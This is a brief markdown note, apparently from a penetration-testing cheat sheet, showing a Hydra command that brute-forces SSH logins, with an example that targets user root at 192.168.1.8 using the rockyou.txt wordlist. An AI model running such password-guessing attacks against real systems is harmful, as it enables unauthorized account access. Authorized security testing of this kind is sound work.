### Perform Bruteforce attack to test

```bash
hydra -l <username> -P <password_list> ssh://<target-ip>
```

## Example

username - root
password_list - rockyou.txt
target_ip - 192.168.1.8

## Command will be:
hydra -l root -P rockyou.txt ssh://192.168.1.8
